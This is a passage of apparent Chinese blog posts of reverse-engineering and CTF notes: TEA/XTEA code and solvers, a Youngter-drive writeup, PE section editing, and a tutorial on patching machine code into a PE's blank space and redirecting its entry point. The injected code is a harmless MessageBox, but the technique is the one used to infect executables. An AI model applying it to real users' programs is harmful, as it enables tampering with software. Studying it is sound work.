class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// //加密函数</span></span><br><span class="line"><span class="comment">//void encrypt (uint32_t* v, uint32_t* k) &#123;</span></span><br><span class="line"><span class="comment">//    uint32_t v0=v[0], v1=v[1], sum=0, i;     //v0,v1分别为字符串的低字节高字节</span></span><br><span class="line"><span class="comment">//    uint32_t delta=0x458BCD42;</span></span><br><span class="line"><span class="comment">//    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];</span></span><br><span class="line"><span class="comment">//    for (i=0; i &lt; 32; i++) &#123;               //加密32轮</span></span><br><span class="line"><span class="comment">//        sum += delta;</span></span><br><span class="line"><span class="comment">//        v0 += ((v1&lt;&lt;6) + k0) ^ (v1 + sum + 11) ^ ((v1&gt;&gt;9) + k1) ^ 0x20;</span></span><br><span class="line"><span class="comment">//        v1 += ((v0&lt;&lt;6) + k2) ^ (v0 + sum + 20) ^ ((v0&gt;&gt;9) + k3) ^ 0x10;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    v[0]=v0; v[1]=v1;//加密后再重新赋值</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//解密函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0, v1;</span><br><span class="line">    <span class="type">uint32_t</span> delta=<span class="number">0x458BCD42</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">4</span>; j += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> sum=<span class="number">0x458BCD42</span> * <span class="number">0x40</span> ;</span><br><span class="line">v0 = v[j];</span><br><span class="line">        v1 = v[j + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">64</span>; i++)</span><br><span class="line">&#123;                        <span class="comment">//解密时将加密算法的顺序倒过来，还有+=变为-=</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">6</span>) + k2) ^ (v0 + sum + <span class="number">20</span>) ^ ((v0&gt;&gt;<span class="number">9</span>) + k3) ^ <span class="number">0x10</span>;</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">6</span>) + k0) ^ (v1 + sum + <span class="number">11</span>) ^ ((v1&gt;&gt;<span class="number">9</span>) + k1) ^ <span class="number">0x20</span>;</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[j]=v0; v[j+<span class="number">1</span>]=v1;<span class="comment">//解密后再重新赋值</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">6</span>]=&#123;<span class="number">0xdf48ef7e</span>,<span class="number">0x20caacf4</span>,<span class="number">0xe0f30fd5</span>,<span class="number">0x5c50d8d6</span>,<span class="number">0x9e1bde2d</span>,<span class="number">0x84f30420</span>&#125;,k[<span class="number">4</span>]=&#123;<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x04</span>&#125;;</span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line"><span class="comment">//    printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);</span></span><br><span class="line"><span class="comment">//    encrypt(v, k);</span></span><br><span class="line"><span class="comment">//    printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);</span></span><br><span class="line">    <span class="built_in">decrypt</span>(v, k);</span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line"><span class="comment">//   cout &lt;&lt; *((char*)&amp;v[i] + 2) &lt;&lt; *((char*)&amp;v[i] + 1) &lt;&lt;  * ((char*)&amp;v[i]); //这可以直接得出flag</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llx&quot;</span>, v[i]);<span class="comment">//这得出的是16进制需要进行转换</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为计算出来的是 16 进制，所以把 16 进制输出后需要进行转换称为字符串·</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【PE】扩大节、新增节、合并节</title>
      <link href="/2024/07/15/%E6%89%A9%E5%A4%A7%E8%8A%82%E3%80%81%E6%96%B0%E5%A2%9E%E8%8A%82%E3%80%81%E5%90%88%E5%B9%B6%E8%8A%82/"/>
      <url>/2024/07/15/%E6%89%A9%E5%A4%A7%E8%8A%82%E3%80%81%E6%96%B0%E5%A2%9E%E8%8A%82%E3%80%81%E5%90%88%E5%B9%B6%E8%8A%82/</url>
      
        <content type="html"><![CDATA[<h1 id="扩大节、新增节、合并节"><a href="#扩大节、新增节、合并节" class="headerlink" title="扩大节、新增节、合并节"></a>扩大节、新增节、合并节</h1><h2 id="详细查看https-bbs-kanxue-com-thread-281836-htm-msg-header-h3-9"><a href="#详细查看https-bbs-kanxue-com-thread-281836-htm-msg-header-h3-9" class="headerlink" title="详细查看https://bbs.kanxue.com/thread-281836.htm#msg_header_h3_9"></a>详细查看<a href="https://bbs.kanxue.com/thread-281836.htm#msg_header_h3_9">https://bbs.kanxue.com/thread-281836.htm#msg_header_h3_9</a></h2><h2 id="扩大节"><a href="#扩大节" class="headerlink" title="扩大节"></a>扩大节</h2><p> 最好只扩大最后一个节</p><p>1、分配一块新的空间了，大小为S</p><p>2、将最后一个节的SizeOfRawData和VirtualSize改成N</p><p>​N &#x3D; （SizeOfRawData或者VirtualSize内存对齐后的值）+S</p><p>3、修改SizeOfImage大小</p><p>4、如果不能执行就在节的末尾的Characteristics属性改成具有可执行的功能</p><h2 id="新增节"><a href="#新增节" class="headerlink" title="新增节"></a>新增节</h2><p> 1、先判断节表有没有空间可以新增一个节表成员</p><p>2、在节表新增一个成员</p><p>3、修改PE头中节的数量</p><p>4、修改SizeOfImage大小</p><p>5、在原有数据的最后，新增一个节的数据（内存对齐整数）</p><p>6、修正新增节表属性</p><h2 id="合并节"><a href="#合并节" class="headerlink" title="合并节"></a>合并节</h2><p>先拉伸，后合并，需要用拉伸后的对齐法进行合并</p><p>1、按照内存对齐展开</p><p>2、将第一个节的内存大小、文件大小改成一样</p><p>​Max &#x3D; SizeOfRawData&gt;VirtualSize ?SizeOfRawData:VirtualSize</p><p>​SizeOfRawData&#x3D;VirtualSize&#x3D;最后一个节的VirtualAddress+Max-SizeOfHeaders内存对齐后的大小</p><p>3、将第一个节的属性改为包含所有节的属性</p><p>4、修改节的数量为1</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【对线程的初认识和初步理解与平衡堆栈】Youngter-drive</title>
      <link href="/2024/07/15/%E3%80%90%E5%AF%B9%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%88%9D%E8%AE%A4%E8%AF%86%E5%92%8C%E5%88%9D%E6%AD%A5%E7%90%86%E8%A7%A3%E3%80%91Youngter-drive/"/>
      <url>/2024/07/15/%E3%80%90%E5%AF%B9%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%88%9D%E8%AE%A4%E8%AF%86%E5%92%8C%E5%88%9D%E6%AD%A5%E7%90%86%E8%A7%A3%E3%80%91Youngter-drive/</url>
      
        <content type="html"><![CDATA[<h1 id="【对线程的初认识和初步理解与平衡堆栈】Youngter-drive"><a href="#【对线程的初认识和初步理解与平衡堆栈】Youngter-drive" class="headerlink" title="【对线程的初认识和初步理解与平衡堆栈】Youngter-drive"></a>【对线程的初认识和初步理解与平衡堆栈】Youngter-drive</h1><p>查壳有壳脱壳ida</p><p>进入到函数main_0</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/youngter-drive/youngter-drive01.png" alt="youngter-drive01"></p><p>第一个函数已经被我改过名称，里面是一个输入函数</p><hr><p><strong>CreateMutexW</strong>是一个Windows API函数，用于<strong>创建命名或未命名的互斥体</strong>（Mutex）对象。<strong>互斥体</strong>是一种同步对象，<strong>允许多个线程&#x3D;&#x3D;同步&#x3D;&#x3D;访问共享资源</strong>，确保<strong>一次只有一个线程</strong>可以<strong>访问该资源</strong>。</p><p><strong>CreateThread</strong>是一个 Windows API 函数，用于<strong>创建一个新的线程</strong>。它允许你<strong>在&#x3D;&#x3D;一个进程中并发执行多个线程&#x3D;&#x3D;<strong>，</strong>每个线程可以&#x3D;&#x3D;独立&#x3D;&#x3D;运行不同的代码</strong>。</p><p><strong>CloseHandle</strong>是一个 Windows API 函数，<strong>用于关闭一个内核对象的句柄。</strong></p><hr><p>跟进<strong>StartAddress</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/youngter-drive/startaddress.png" alt="startaddress"></p><p>这里执行完encp函数会暂停100秒</p><p>跟进<strong>sub_9E119F</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/youngter-drive/sub_9E119F.png" alt="sub_9E119F"></p><hr><p>当<strong>StartAddress</strong>运行完暂停后运行<strong>sub_9E119F</strong></p><p><strong>sub_9E119F</strong>它只有一个减减的功能，然后暂停给100s</p><p><strong>sub_9E119F</strong>暂停时，此刻<strong>StartAddress</strong>开始进行操作</p><h2 id="即为当TABLE是奇数时运行加密；当TABLE时偶数时不进行加密保留原来状态"><a href="#即为当TABLE是奇数时运行加密；当TABLE时偶数时不进行加密保留原来状态" class="headerlink" title="即为当TABLE是奇数时运行加密；当TABLE时偶数时不进行加密保留原来状态"></a>即为当<strong>TABLE是奇数</strong>时运行加密；当<strong>TABLE时偶数</strong>时<strong>不进行加密</strong>保留原来状态</h2><p>进入<strong>encp</strong>（已经改过名称）</p><p>这里需要平衡堆栈消去红名，按照这个视频做：<a href="https://www.bilibili.com/video/BV1V84y1j7rS/?spm_id_from=333.880.my_history.page.click&vd_source=1c1b392be21faf2076e99a04a9cb6b82">https://www.bilibili.com/video/BV1V84y1j7rS/?spm_id_from=333.880.my_history.page.click&amp;vd_source=1c1b392be21faf2076e99a04a9cb6b82</a></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/youngter-drive/encp.png" alt="encp"></p><p>这就是加密，大小字符转换和在预定的字符串寻址</p><p>结合上面的线程操作可得出脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">txt = <span class="string">&#x27;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#x27;</span></span><br><span class="line">enc = <span class="string">&#x27;TOiZiZtOrYaToUwPnToBsOaOapsyS&#x27;</span></span><br><span class="line">flag = <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        flag += enc[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> enc[i].isupper():</span><br><span class="line">            flag += <span class="built_in">chr</span>(txt.find(enc[i]) + <span class="number">96</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(txt.find(enc[i]) + <span class="number">38</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>但是会少一个字节，因为TABLE是29，在循环的时候是处理了30个字符</p><p>而密文只有29位所以要猜</p><p>最后猜的出的是要在脚本得出的flag后加上个E</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【PE】RVA与FOA的转换 和 空白区域添加代码</title>
      <link href="/2024/07/12/RVA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E6%8D%A2%20%E5%92%8C%20%E7%A9%BA%E7%99%BD%E5%8C%BA%E5%9F%9F%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/"/>
      <url>/2024/07/12/RVA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E6%8D%A2%20%E5%92%8C%20%E7%A9%BA%E7%99%BD%E5%8C%BA%E5%9F%9F%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="RVA与FOA的转换-和-空白区域添加代码"><a href="#RVA与FOA的转换-和-空白区域添加代码" class="headerlink" title="RVA与FOA的转换 和 空白区域添加代码"></a>RVA与FOA的转换 和 空白区域添加代码</h1><h2 id="RVA与FOA的转换"><a href="#RVA与FOA的转换" class="headerlink" title="RVA与FOA的转换"></a>RVA与FOA的转换</h2><p>RVA（相对虚拟地址）：内存地址 - Imagebase</p><p>FOA（文件偏移地址）：</p><p>​1、判断RVA是否在头部</p><p>​（1）如果在头部：FOV &#x3D; RVA</p><p>​2、判断RVA位于哪个节：</p><p>​RVA &gt;&#x3D;节.VirtualAddress</p><p>​RVA&lt;&#x3D;节.VirtualAddress + 当前节<strong>内存对齐后的大小</strong></p><p>​差值 &#x3D; RVA - 节.VirtualAddress</p><p>​3、FOA &#x3D;节 .PointerToRawData + 差值</p><h2 id="空白区域添加代码"><a href="#空白区域添加代码" class="headerlink" title="空白区域添加代码"></a>空白区域添加代码</h2><p>外链帮助：<br>【PE文件入门，一篇就够了】<a href="https://bbs.kanxue.com/thread-281836.htm#msg_header_h3_11">https://bbs.kanxue.com/thread-281836.htm#msg_header_h3_11</a></p><p>我们要插入这样一个代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    MessageBox(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bbs.kanxue.com/upload/attach/202405/984774_4VT9QNAKK83KRDC.webp" alt="img"></p><p>功能呢就是弹出一个这样的错误窗口。这个程序的核心就是调用了一个messagebox函数弹出了一个窗口。由于我们是要对pe文件进行操作，所以肯定不是将代码写入，而是要将机器码插入。就是利于栈传第四个参数0，然后call。 <img src="https://bbs.kanxue.com/upload/attach/202405/984774_KT75GA72HJ2S6H9.webp" alt="img"></p><ol><li><p>构造要写入的代码 6A 00 6A 00 6A 00 6A 00 E8（call）xx xx，我们看到的FF是(near jump)要使用一个什么导入表（后面会学），而我们插入的时候E8利用相对偏移量调用函数。E8后面跟四个字节的相对偏移量offset，怎么计算？还好了解过汇编，offset&#x3D;要跳转的地方的地址-call指令下面一条指令的地址。 <img src="https://bbs.kanxue.com/upload/attach/202405/984774_CXY5HK8P5TZBG2P.webp" alt="img"></p><p><img src="https://bbs.kanxue.com/upload/attach/202405/984774_SBJX8WRWC3RF2WS.webp" alt="img"></p><p>将图一标记位置改为call 1c1023 得到图二，后面的0A&#x3D;1c1023-1c1019.我们的目标指示让他弹出窗口，不能破坏程序运行，所以弹出之后我们还要跳回到初始位置，让程序正常运行，我们使用JMP（E9）指令来实现该操作，E9后面也是跟偏移量，用法与E8相同。找到messagebox的地址75858A70。根据call指令的位置来计算。 <img src="https://bbs.kanxue.com/upload/attach/202405/984774_SN5DERUWVXB5EHM.webp" alt="img"></p><p><img src="https://bbs.kanxue.com/upload/attach/202405/984774_2WSAU8BCZBMW85C.webp" alt="img"></p><p>E8所在的位置是3A8，这是文件中的位置，我们要考虑的是运行时的位置，所以要把这个地址加上Image Base &#x3D;01000000,所以最后得到的 offset&#x3D;75858A70-010003A8-5&#x3D;7485 86C3.最后跳转到程序的入口处，查看可选头的成员入口值为739D加上Image Base得到0100739D. offset&#x3D;0100739D-010003AD-5&#x3D;6FEB <img src="https://bbs.kanxue.com/upload/attach/202405/984774_JTHAXGTNETD5DTR.webp" alt="img"></p></li><li><p>将程序入口点指向我们插入的代码，</p><p>也就是修改扩展pe头里的入口值</p><p><img src="https://bbs.kanxue.com/upload/attach/202405/984774_HWVWN8AGXW9PECU.webp" alt="img"></p></li></ol><p>在108处占4个字节，我们插入的程序起始位置是000003A0.然后，然后就没然后了，程序运行不起，ida和od看到的东西都很奇怪，延误了两天，这里我直接说一下踩的坑，我随意找了一个空白处填充机器码，但后来发现不是所有的位置都能发生跳转，然后就将指令插入在了text段的末尾，然后发现跳转的有些差异，不会跳转在我设置的地方，后知后觉的发现，视频里的老哥演示的的时候拿的是一个文件对齐和内存对齐相同大小的程序，我用的程序是一个不同的，所以就要计算一下 用我们前面学习到的知识。下面理一下步骤</p><ol><li>首先在文件中确定一段空间，然后运行程序的时候查看 是否为空</li><li>插入，根据内存中的位置计算</li><li>改入口，内存中代码的起始位置 <img src="https://bbs.kanxue.com/upload/attach/202405/984774_F2XDXYHGUTVBS3R.webp" alt="img"></li></ol><p>第一次尝试的时候成功弹出了窗口，但是关闭之后没有出现记事本，由此我们可以判断执行完我们的代码后，没有成功的返回原入口。此时才想起来补码写错了，插入的位置是87b0，入口点是739d，739d-83b0-5&#x3D; <img src="https://bbs.kanxue.com/upload/attach/202405/984774_D7HRYQ8HEYMY6CM.webp" alt="img"></p><p>然后我就在e9后面填充了E8 EF 00 00,意识到返回出现问题后，想到了有符号数的符号扩展，应该扩展其符号位即1，所以正确的补码形式是FF FF EF E8,填充进去就是E8 EF FF FF.</p><p>外链帮助：<br>【PE文件入门，一篇就够了】<a href="https://bbs.kanxue.com/thread-281836.htm#msg_header_h3_11">https://bbs.kanxue.com/thread-281836.htm#msg_header_h3_11</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>TEA，XTEA与XXTEA及其例题</title>
      <link href="/2024/07/12/TEA%EF%BC%8CXTEA%E4%B8%8EXXTEA%E5%8F%8A%E5%85%B6%E4%BE%8B%E9%A2%98/"/>
      <url>/2024/07/12/TEA%EF%BC%8CXTEA%E4%B8%8EXXTEA%E5%8F%8A%E5%85%B6%E4%BE%8B%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="TEA，XTEA-与-XXTEA-及其例题"><a href="#TEA，XTEA-与-XXTEA-及其例题" class="headerlink" title="TEA，XTEA 与 XXTEA 及其例题"></a>TEA，XTEA 与 XXTEA 及其例题</h1><p>不介绍背景了，直接上算法</p><h2 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h2><p>TEA 算法是一种对称加密算法，全称为 Tiny Encryption Algorithm。它使用一个 128 位的密钥和 64 位的明文块，通过多轮迭代加密来实现加密过程。TEA 算法的加密和解密过程是相同的，只是密钥的使用顺序不同。其拥有一个叫做 Feistel 结构的密码学结构。这种密码学结构通俗的来讲就是会将加密的 plaintext 分成 L、R 两部分，并且满足 L*{i+1} &#x3D; R_i, R*{i+1} &#x3D; F(K_i,R_i) \oplus L_i 这种交换式的加密方式的一种结构。tea 算法最关键的是要找到 DELTA 值和 128 位的 key。其中 DELTA 常常是存在 0x9e3779b9，但是也存在 DELTA 的值被改变的代码。除了初等 tea 算法，tea 算法还有很多魔改版本。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/tea/tea.png" alt="tea"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//加密函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;     <span class="comment">//v0,v1分别为字符串的低字节高字节</span></span><br><span class="line">    <span class="type">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;               <span class="comment">//加密32轮</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;<span class="comment">//加密后再重新赋值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解密函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;</span><br><span class="line">    <span class="type">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                        <span class="comment">//解密时将加密算法的顺序倒过来，还有+=变为-=</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;<span class="comment">//解密后再重新赋值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,k[<span class="number">4</span>]=&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密前原始数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">encrypt</span>(v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">decrypt</span>(v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="xTEA"><a href="#xTEA" class="headerlink" title="xTEA"></a>xTEA</h2><p>XTEA 是 TEA 的升级版：</p><p>XTEA 算法的加密和解密过程都是由多轮迭代完成的。每轮迭代都包括四个步骤：轮密钥加、代换、置换和轮密钥加。其中，代换和置换步骤是 XTEA 算法的核心部分。XTEA 算法是 TEA 算法的魔改算法。XTEA 算法四个子密钥采取不正规的方式进行混合以阻止密钥表攻击。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/tea/xtea.png" alt="xtea"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, delta=<span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; 